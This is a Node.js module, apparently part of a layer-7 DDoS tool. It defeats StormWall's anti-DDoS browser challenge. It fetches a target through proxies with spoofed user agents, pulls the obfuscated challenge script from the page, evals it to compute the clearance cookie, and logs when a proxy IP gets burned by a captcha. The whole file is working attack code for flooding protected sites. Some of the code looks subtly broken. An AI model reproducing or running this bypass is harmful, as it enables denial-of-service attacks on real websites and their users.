stormwall.js
module.exports = function Stormwall() {
    const request = require('cloudscraper'),
        document = {
            cookie: ''
        };

    global.window = {navigator: {}};

    var BYPASSIT = {};

    var _0xda3f = ['__phantom', 'Buffer', 'emit', 'spawn', 'domAutomation', 'webdriver', 'selenium', './adv', '0123456789qwertyuiopasdfghjklzxcvbnm:?!', 'toString', 'getElementById', 'className', 'error-frame', 'invisible', 'undefined', 'location', 'Cannot\x20find\x20module\x20\x27', 'MODULE_NOT_FOUND', 'exports', 'function', 'length', '_phantom'];
    (function (_0x502b53, _0x2696a0) {
        var _0xe3cb5a = function (_0x4f70f6) {
            while (--_0x4f70f6) {
                _0x502b53['push'](_0x502b53['shift']());
            }
        };
        _0xe3cb5a(++_0x2696a0);
    }(_0xda3f, 0xec));
    var _0xfda3 = function (_0x3854ba, _0x105aa1) {
        _0x3854ba = _0x3854ba - 0x0;
        var _0x36d4c9 = _0xda3f[_0x3854ba];
        return _0x36d4c9;
    };
    (function e(_0x33f0ce, _0x4e1686, _0x58a80c) {
        function _0x23a0c0(_0x4bc934, _0x149a56) {
            if (!_0x4e1686[_0x4bc934]) {
                if (!_0x33f0ce[_0x4bc934]) {
                    var _0x37652d = typeof require == 'function' && require;
                    if (!_0x149a56 && _0x37652d) return _0x37652d(_0x4bc934, !0x0);
                    if (_0x7bb490) return _0x7bb490(_0x4bc934, !0x0);
                    var _0x36dc71 = new Error(_0xfda3('0x0') + _0x4bc934 + '\x27');
                    throw _0x36dc71['code'] = _0xfda3('0x1'), _0x36dc71;
                }
                var _0x43a010 = _0x4e1686[_0x4bc934] = {
                    'exports': {}
                };
                _0x33f0ce[_0x4bc934][0x0]['call'](_0x43a010['exports'], function (_0x316792) {
                    var _0x4e1686 = _0x33f0ce[_0x4bc934][0x1][_0x316792];
                    return _0x23a0c0(_0x4e1686 ? _0x4e1686 : _0x316792);
                }, _0x43a010, _0x43a010[_0xfda3('0x2')], e, _0x33f0ce, _0x4e1686, _0x58a80c);
            }
            return _0x4e1686[_0x4bc934][_0xfda3('0x2')];
        }
        var _0x7bb490 = typeof require == _0xfda3('0x3') && require;
        for (var _0x46655c = 0x0; _0x46655c < _0x58a80c[_0xfda3('0x4')]; _0x46655c++) _0x23a0c0(_0x58a80c[_0x46655c]);
        return _0x23a0c0;
    }({
        1: [function (_0xdc5b45, _0x14d549, _0x102643) {
            let _0x4713ba = {
                'a': window['callPhantom'],
                'b': window[_0xfda3('0x5')],
                'c': window[_0xfda3('0x6')],
                'd': window[_0xfda3('0x7')],
                'e': window[_0xfda3('0x8')],
                'f': window[_0xfda3('0x9')],
                'g': window['webdriver'],
                'h': window[_0xfda3('0xa')],
                'i': window['navigator'][_0xfda3('0xb')],
                'j': window[_0xfda3('0xc')],
                'k': window['navigator']['selenium']
            };

            function _0x587e9b() {
                for (let _0x227d72 in _0x4713ba) {
                    if (_0x4713ba[_0x227d72]) {
                        return !![];
                    }
                }
                return ![];
            }
            _0x14d549[_0xfda3('0x2')] = _0x587e9b;
        }, {}],
        2: [function (_0x5ea793, _0x57a229, _0x533365) {
            let _0x80ea80 = _0x5ea793(_0xfda3('0xd'));
            let _0x249dc6 = _0xfda3('0xe');
            let _0x34900d = [];
            let _0x40d702 = {};

            function _0x2aadcb(_0x93c8ef) {
                for (let _0x4680bf = 0x0; _0x4680bf < _0x93c8ef[_0xfda3('0x4')]; _0x4680bf++) {
                    _0x34900d[_0x4680bf] = _0x93c8ef[_0x4680bf];
                    _0x40d702[_0x93c8ef[_0x4680bf]] = _0x4680bf;
                }
            }

            function _0x54a7c6(_0x15ddb9, _0x1bbdda) {
                let _0x12d568 = _0x34900d[_0xfda3('0x4')] - 0x1;
                let _0x59a887 = '';
                for (let _0x42faad = 0x0; _0x42faad < _0x1bbdda[_0xfda3('0x4')]; _0x42faad++) {
                    let _0x2ee74c = _0x1bbdda[_0x42faad];
                    if (typeof _0x40d702[_0x2ee74c] == 'undefined') {
                        _0x59a887 = _0x59a887 + _0x2ee74c;
                    } else {
                        let _0x5ad52a = _0x40d702[_0x2ee74c] + _0x15ddb9;
                        if (_0x5ad52a > _0x12d568) {
                            _0x5ad52a = _0x5ad52a - _0x12d568 - 0x1;
                        } else if (_0x5ad52a < 0x0) {
                            _0x5ad52a = _0x12d568 + _0x5ad52a + 0x1;
                        }
                        _0x59a887 = _0x59a887 + _0x34900d[_0x5ad52a];
                    }
                }
                return _0x59a887;
            }

            function _0xa0449d(_0x38d428, _0x4ea9f5) {
                let _0x545320 = _0x34900d[_0xfda3('0x4')] - 0x1;
                let _0xef2535 = _0x38d428;
                let _0x1e15a8 = '';
                for (let _0x2c0ae9 = 0x0; _0x2c0ae9 < _0x4ea9f5[_0xfda3('0x4')]; _0x2c0ae9++) {
                    let _0x2b84b7 = '' + _0x4ea9f5[_0x2c0ae9];
                    _0x1e15a8 = _0x1e15a8 + _0x54a7c6(_0xef2535, _0x2b84b7);
                    _0xef2535 = _0xef2535 + 0x1;
                    if (_0xef2535 > _0x545320) {
                        _0xef2535 = 0x0;
                    }
                }
                return _0x1e15a8;
            }

            function _0x2677f6(_0xc6fb9a, _0x16eaa6) {
                let _0x5499f5 = _0x34900d[_0xfda3('0x4')] - 0x1;
                let _0x2d5b44 = _0xc6fb9a;
                let _0x2e8bf8 = '';
                if (_0x80ea80()) {
                    _0x2e8bf8 += Date['new']()[_0xfda3('0xf')]();
                    res += ':';
                }
                for (let _0x39e246 = 0x0; _0x39e246 < _0x16eaa6[_0xfda3('0x4')]; _0x39e246++) {
                    let _0x38946d = '' + _0x16eaa6[_0x39e246];
                    _0x2e8bf8 = _0x2e8bf8 + _0x54a7c6(_0x2d5b44 * -0x1, _0x38946d);
                    _0x2d5b44 = _0x2d5b44 + 0x1;
                    if (_0x2d5b44 > _0x5499f5) {
                        _0x2d5b44 = 0x0;
                    }
                }
                return _0x2e8bf8;
            }

            let _0x474992 = 0x0;
            if (typeof googleAnal != _0xfda3('0x14') || typeof yaMetrika != _0xfda3('0x14')) _0x474992 = 0x3e8;
            _0x2aadcb(_0x249dc6);
            BYPASSIT = function (defines) {
                return eval(defines + '; document.cookie = cN + \'=\' + _0x2677f6(cK, cE)');
            }
        }, {
            './adv': 0x1
        }]
    }, {}, [0x2]));

    function Bypasser(body) {
        return new Promise((resolve, reject) => {
            resolve(BYPASSIT(body.split('<script>')[2].split('</script>')[0])); // Wallah return the bypass cookie;
        });
    }

    return function bypass(proxy, uagent, callback) {
        request({
            method: "GET",
            url: l7.target,
            gzip: true,
            proxy: proxy,
            followAllRedirects: true,
            headers: {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': 1,
                'User-Agent': uagent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9'
            }
        }, (err, res, body) => {
            if (err || !res || !body || body.indexOf('const cN = ') == -1) {
                if (body && body.indexOf('Your browser cannot be verified automatically, please confirm you are not a robot.') !== -1) {
                    return logger('[stormwall] Captcha received, IP reputation died.');
                }
                return false;
            }
            Bypasser(body).then(cookie => {
                request({
                    method: "GET",
                    url: l7.target,
                    gzip: true,
                    proxy: proxy,
                    followAllRedirects: true,
                    headers: {
                        'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': 1,
                        'User-Agent': uagent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.5',
                        "Cookie": cookie
                    }
                }, (err, res, body) => {
                    if (err || !res) {
                        return false;
                    }
                    //console.log(cookie, body);
                    callback(cookie);
                })
            });
        });
    }
}
